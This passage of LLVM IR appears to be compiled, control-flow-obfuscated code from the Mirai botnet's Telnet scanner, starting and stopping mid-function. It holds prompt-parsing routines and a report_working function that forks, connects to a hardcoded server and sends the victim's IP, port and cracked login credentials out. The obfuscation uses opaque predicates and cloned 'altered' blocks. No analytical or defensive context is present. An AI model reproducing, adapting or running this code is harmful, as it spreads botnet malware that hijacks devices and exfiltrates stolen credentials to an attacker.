  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds [256 x i8], [256 x i8]* %62, i64 0, i64 %64
  %66 = load i8, i8* %65, align 1
  %67 = sext i8 %66 to i32
  %68 = icmp eq i32 %67, 35
  br i1 %68, label %69, label %72

; <label>:69:                                     ; preds = %60, %originalBBpart2, %26, %17
  %70 = load i32, i32* %5, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %6, align 4
  br label %108

; <label>:72:                                     ; preds = %60
  %73 = load i32, i32* @x.69
  %74 = load i32, i32* @y.70
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %72
  %81 = load i32, i32* @x.69
  %82 = load i32, i32* @y.70
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %89

; <label>:89:                                     ; preds = %originalBBpart24
  %90 = load i32, i32* @x.69
  %91 = load i32, i32* @y.70
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %89
  %98 = load i32, i32* %5, align 4
  %99 = add nsw i32 %98, -1
  store i32 %99, i32* %5, align 4
  %100 = load i32, i32* @x.69
  %101 = load i32, i32* @y.70
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart29, label %originalBB6alteredBB

originalBBpart29:                                 ; preds = %originalBB6
  br label %14

; <label>:108:                                    ; preds = %69, %14
  %109 = load i32, i32* %6, align 4
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %144

; <label>:111:                                    ; preds = %108
  call void @table_unlock_val(i8 zeroext 25)
  %112 = call i8* @table_retrieve_val(i32 25, i32* %9)
  store i8* %112, i8** %7, align 8
  %113 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %114 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %113, i32 0, i32 7
  %115 = getelementptr inbounds [256 x i8], [256 x i8]* %114, i32 0, i32 0
  %116 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %117 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %116, i32 0, i32 6
  %118 = load i32, i32* %117, align 4
  %119 = load i8*, i8** %7, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sub nsw i32 %120, 1
  %122 = call i32 @util_memsearch(i8* %115, i32 %118, i8* %119, i32 %121)
  %123 = icmp ne i32 %122, -1
  %124 = zext i1 %123 to i32
  store i32 %124, i32* %8, align 4
  br i1 %123, label %125, label %143

; <label>:125:                                    ; preds = %111
  %126 = load i32, i32* @x.69
  %127 = load i32, i32* @y.70
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %125
  %134 = load i32, i32* %8, align 4
  store i32 %134, i32* %6, align 4
  %135 = load i32, i32* @x.69
  %136 = load i32, i32* @y.70
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br label %143

; <label>:143:                                    ; preds = %originalBBpart213, %111
  br label %144

; <label>:144:                                    ; preds = %143, %108
  call void @table_lock_val(i8 zeroext 25)
  %145 = load i32, i32* %6, align 4
  %146 = icmp eq i32 %145, -1
  br i1 %146, label %147, label %148

; <label>:147:                                    ; preds = %144
  store i32 0, i32* %2, align 4
  br label %166

; <label>:148:                                    ; preds = %144
  %149 = load i32, i32* @x.69
  %150 = load i32, i32* @y.70
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %148
  %157 = load i32, i32* %6, align 4
  store i32 %157, i32* %2, align 4
  %158 = load i32, i32* @x.69
  %159 = load i32, i32* @y.70
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %166

; <label>:166:                                    ; preds = %originalBBpart217, %147
  %167 = load i32, i32* %2, align 4
  ret i32 %167

originalBBalteredBB:                              ; preds = %originalBB, %35
  %168 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %169 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %168, i32 0, i32 7
  %170 = load i32, i32* %5, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds [256 x i8], [256 x i8]* %169, i64 0, i64 %171
  %173 = load i8, i8* %172, align 1
  %174 = sext i8 %173 to i32
  %175 = icmp eq i32 %174, 36
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %72
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %89
  %176 = load i32, i32* %5, align 4
  %_ = shl i32 %176, -1
  %_7 = sub i32 %176, -1
  %gen = mul i32 %_7, -1
  %177 = add nsw i32 %176, -1
  store i32 %177, i32* %5, align 4
  br label %originalBB6

originalBB11alteredBB:                            ; preds = %originalBB11, %125
  %178 = load i32, i32* %8, align 4
  store i32 %178, i32* %6, align 4
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %148
  %179 = load i32, i32* %6, align 4
  store i32 %179, i32* %2, align 4
  br label %originalBB15
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_any_prompt(%struct.scanner_connection*) #0 {
  %2 = load i32, i32* @x.71
  %3 = load i32, i32* @y.72
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca %struct.scanner_connection*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %11, align 8
  store i32 -1, i32* %14, align 4
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 6
  %17 = load i32, i32* %16, align 4
  %18 = sub nsw i32 %17, 1
  store i32 %18, i32* %13, align 4
  %19 = load i32, i32* @x.71
  %20 = load i32, i32* @y.72
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %111, %originalBBpart2
  %28 = load i32, i32* @x.71
  %29 = load i32, i32* @y.72
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %27
  %36 = load i32, i32* %13, align 4
  %37 = icmp sgt i32 %36, 0
  %38 = load i32, i32* @x.71
  %39 = load i32, i32* @y.72
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br i1 %37, label %46, label %114

; <label>:46:                                     ; preds = %originalBBpart29
  %47 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %48 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %47, i32 0, i32 7
  %49 = load i32, i32* %13, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [256 x i8], [256 x i8]* %48, i64 0, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = sext i8 %52 to i32
  %54 = icmp eq i32 %53, 58
  br i1 %54, label %107, label %55

; <label>:55:                                     ; preds = %46
  %56 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %57 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %56, i32 0, i32 7
  %58 = load i32, i32* %13, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [256 x i8], [256 x i8]* %57, i64 0, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp eq i32 %62, 62
  br i1 %63, label %107, label %64

; <label>:64:                                     ; preds = %55
  %65 = load i32, i32* @x.71
  %66 = load i32, i32* @y.72
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %64
  %73 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %74 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %73, i32 0, i32 7
  %75 = load i32, i32* %13, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds [256 x i8], [256 x i8]* %74, i64 0, i64 %76
  %78 = load i8, i8* %77, align 1
  %79 = sext i8 %78 to i32
  %80 = icmp eq i32 %79, 36
  %81 = load i32, i32* @x.71
  %82 = load i32, i32* @y.72
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br i1 %80, label %107, label %89

; <label>:89:                                     ; preds = %originalBBpart213
  %90 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %91 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %90, i32 0, i32 7
  %92 = load i32, i32* %13, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [256 x i8], [256 x i8]* %91, i64 0, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = sext i8 %95 to i32
  %97 = icmp eq i32 %96, 35
  br i1 %97, label %107, label %98

; <label>:98:                                     ; preds = %89
  %99 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %100 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %99, i32 0, i32 7
  %101 = load i32, i32* %13, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds [256 x i8], [256 x i8]* %100, i64 0, i64 %102
  %104 = load i8, i8* %103, align 1
  %105 = sext i8 %104 to i32
  %106 = icmp eq i32 %105, 37
  br i1 %106, label %107, label %110

; <label>:107:                                    ; preds = %98, %89, %originalBBpart213, %55, %46
  %108 = load i32, i32* %13, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %14, align 4
  br label %114

; <label>:110:                                    ; preds = %98
  br label %111

; <label>:111:                                    ; preds = %110
  %112 = load i32, i32* %13, align 4
  %113 = add nsw i32 %112, -1
  store i32 %113, i32* %13, align 4
  br label %27

; <label>:114:                                    ; preds = %107, %originalBBpart29
  %115 = load i32, i32* %14, align 4
  %116 = icmp eq i32 %115, -1
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %114
  store i32 0, i32* %10, align 4
  br label %136

; <label>:118:                                    ; preds = %114
  %119 = load i32, i32* @x.71
  %120 = load i32, i32* @y.72
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %118
  %127 = load i32, i32* %14, align 4
  store i32 %127, i32* %10, align 4
  %128 = load i32, i32* @x.71
  %129 = load i32, i32* @y.72
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %136

; <label>:136:                                    ; preds = %originalBBpart217, %117
  %137 = load i32, i32* @x.71
  %138 = load i32, i32* @y.72
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %136
  %145 = load i32, i32* %10, align 4
  %146 = load i32, i32* @x.71
  %147 = load i32, i32* @y.72
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  ret i32 %145

originalBBalteredBB:                              ; preds = %originalBB, %1
  %154 = alloca i32, align 4
  %155 = alloca %struct.scanner_connection*, align 8
  %156 = alloca i8*, align 8
  %157 = alloca i32, align 4
  %158 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %155, align 8
  store i32 -1, i32* %158, align 4
  %159 = load %struct.scanner_connection*, %struct.scanner_connection** %155, align 8
  %160 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %159, i32 0, i32 6
  %161 = load i32, i32* %160, align 4
  %_ = sub i32 %161, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 %161, 1
  %gen2 = mul i32 %_1, 1
  %_3 = shl i32 %161, 1
  %_4 = sub i32 %161, 1
  %gen5 = mul i32 %_4, 1
  %_6 = shl i32 %161, 1
  %162 = sub nsw i32 %161, 1
  store i32 %162, i32* %157, align 4
  br label %originalBB

originalBB7alteredBB:                             ; preds = %originalBB7, %27
  %163 = load i32, i32* %13, align 4
  %164 = icmp sgt i32 %163, 0
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %64
  %165 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %166 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %165, i32 0, i32 7
  %167 = load i32, i32* %13, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds [256 x i8], [256 x i8]* %166, i64 0, i64 %168
  %170 = load i8, i8* %169, align 1
  %171 = sext i8 %170 to i32
  %172 = icmp eq i32 %171, 36
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %118
  %173 = load i32, i32* %14, align 4
  store i32 %173, i32* %10, align 4
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %136
  %174 = load i32, i32* %10, align 4
  br label %originalBB19
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %7 = call i8* @table_retrieve_val(i32 10, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  %18 = icmp ne i32 %17, -1
  br i1 %18, label %19, label %36

; <label>:19:                                     ; preds = %1
  %20 = load i32, i32* @x.73
  %21 = load i32, i32* @y.74
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  call void @table_lock_val(i8 zeroext 10)
  store i32 -1, i32* %2, align 4
  %28 = load i32, i32* @x.73
  %29 = load i32, i32* @y.74
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %85

; <label>:36:                                     ; preds = %1
  %37 = load i32, i32* @x.73
  %38 = load i32, i32* @y.74
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %36
  call void @table_lock_val(i8 zeroext 10)
  call void @table_unlock_val(i8 zeroext 9)
  %45 = call i8* @table_retrieve_val(i32 9, i32* %6)
  store i8* %45, i8** %4, align 8
  %46 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %47 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %46, i32 0, i32 7
  %48 = getelementptr inbounds [256 x i8], [256 x i8]* %47, i32 0, i32 0
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 6
  %51 = load i32, i32* %50, align 4
  %52 = load i8*, i8** %4, align 8
  %53 = load i32, i32* %6, align 4
  %54 = sub nsw i32 %53, 1
  %55 = call i32 @util_memsearch(i8* %48, i32 %51, i8* %52, i32 %54)
  store i32 %55, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 9)
  %56 = load i32, i32* %5, align 4
  %57 = icmp eq i32 %56, -1
  %58 = load i32, i32* @x.73
  %59 = load i32, i32* @y.74
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart214, label %originalBB1alteredBB

originalBBpart214:                                ; preds = %originalBB1
  br i1 %57, label %66, label %83

; <label>:66:                                     ; preds = %originalBBpart214
  %67 = load i32, i32* @x.73
  %68 = load i32, i32* @y.74
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %66
  store i32 0, i32* %2, align 4
  %75 = load i32, i32* @x.73
  %76 = load i32, i32* @y.74
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %85

; <label>:83:                                     ; preds = %originalBBpart214
  %84 = load i32, i32* %5, align 4
  store i32 %84, i32* %2, align 4
  br label %85

; <label>:85:                                     ; preds = %83, %originalBBpart218, %originalBBpart2
  %86 = load i32, i32* @x.73
  %87 = load i32, i32* @y.74
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %85
  %94 = load i32, i32* %2, align 4
  %95 = load i32, i32* @x.73
  %96 = load i32, i32* @y.74
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  ret i32 %94

originalBBalteredBB:                              ; preds = %originalBB, %19
  call void @table_lock_val(i8 zeroext 10)
  store i32 -1, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %36
  call void @table_lock_val(i8 zeroext 10)
  call void @table_unlock_val(i8 zeroext 9)
  %103 = call i8* @table_retrieve_val(i32 9, i32* %6)
  store i8* %103, i8** %4, align 8
  %104 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %105 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %104, i32 0, i32 7
  %106 = getelementptr inbounds [256 x i8], [256 x i8]* %105, i32 0, i32 0
  %107 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %108 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %107, i32 0, i32 6
  %109 = load i32, i32* %108, align 4
  %110 = load i8*, i8** %4, align 8
  %111 = load i32, i32* %6, align 4
  %_ = sub i32 0, %111
  %gen = add i32 %_, 1
  %_2 = shl i32 %111, 1
  %_3 = sub i32 %111, 1
  %gen4 = mul i32 %_3, 1
  %_5 = shl i32 %111, 1
  %_6 = sub i32 %111, 1
  %gen7 = mul i32 %_6, 1
  %_8 = sub i32 %111, 1
  %gen9 = mul i32 %_8, 1
  %_10 = shl i32 %111, 1
  %_11 = sub i32 0, %111
  %gen12 = add i32 %_11, 1
  %112 = sub nsw i32 %111, 1
  %113 = call i32 @util_memsearch(i8* %106, i32 %109, i8* %110, i32 %112)
  store i32 %113, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 9)
  %114 = load i32, i32* %5, align 4
  %115 = icmp eq i32 %114, -1
  br label %originalBB1

originalBB16alteredBB:                            ; preds = %originalBB16, %66
  store i32 0, i32* %2, align 4
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %85
  %116 = load i32, i32* %2, align 4
  br label %originalBB20
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i16 zeroext, %struct.scanner_auth*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.scanner_auth*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store %struct.scanner_auth* %2, %struct.scanner_auth** %6, align 8
  %12 = call i32 @fork() #6
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* %8, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %18, label %15

; <label>:15:                                     ; preds = %3
  %16 = load i32, i32* %8, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %15, %3
  br label %127

; <label>:19:                                     ; preds = %15
  %20 = load i32, i32* @x.75
  %21 = load i32, i32* @y.76
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %28, i32* %9, align 4
  %29 = icmp eq i32 %28, -1
  %30 = load i32, i32* @x.75
  %31 = load i32, i32* @y.76
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %38, label %39

; <label>:38:                                     ; preds = %originalBBpart2
  br label %39

; <label>:39:                                     ; preds = %38, %originalBBpart2
  %40 = load i32, i32* @x.75
  %41 = load i32, i32* @y.76
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %39
  call void @table_unlock_val(i8 zeroext 2)
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %48, align 4
  %49 = call i32 @inet_addr(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.33, i32 0, i32 0)) #6
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %51 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %50, i32 0, i32 0
  store i32 %49, i32* %51, align 4
  %52 = call i8* @table_retrieve_val(i32 2, i32* null)
  %53 = bitcast i8* %52 to i16*
  %54 = load i16, i16* %53, align 2
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %54, i16* %55, align 2
  call void @table_lock_val(i8 zeroext 2)
  %56 = load i32, i32* %9, align 4
  %57 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %58 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %58, %struct.sockaddr** %57, align 8
  %59 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %60 = load %struct.sockaddr*, %struct.sockaddr** %59, align 8
  %61 = call i32 @connect(i32 %56, %struct.sockaddr* %60, i32 16)
  %62 = icmp eq i32 %61, -1
  %63 = load i32, i32* @x.75
  %64 = load i32, i32* @y.76
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %62, label %71, label %74

; <label>:71:                                     ; preds = %originalBBpart24
  %72 = load i32, i32* %9, align 4
  %73 = call i32 @close(i32 %72)
  br label %74

; <label>:74:                                     ; preds = %71, %originalBBpart24
  %75 = load i32, i32* @x.75
  %76 = load i32, i32* @y.76
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  store i8 0, i8* %11, align 1
  %83 = load i32, i32* %9, align 4
  %84 = call i64 @send(i32 %83, i8* %11, i64 1, i32 16384)
  %85 = load i32, i32* %9, align 4
  %86 = bitcast i32* %4 to i8*
  %87 = call i64 @send(i32 %85, i8* %86, i64 4, i32 16384)
  %88 = load i32, i32* %9, align 4
  %89 = bitcast i16* %5 to i8*
  %90 = call i64 @send(i32 %88, i8* %89, i64 2, i32 16384)
  %91 = load i32, i32* %9, align 4
  %92 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %93 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %92, i32 0, i32 4
  %94 = call i64 @send(i32 %91, i8* %93, i64 1, i32 16384)
  %95 = load i32, i32* %9, align 4
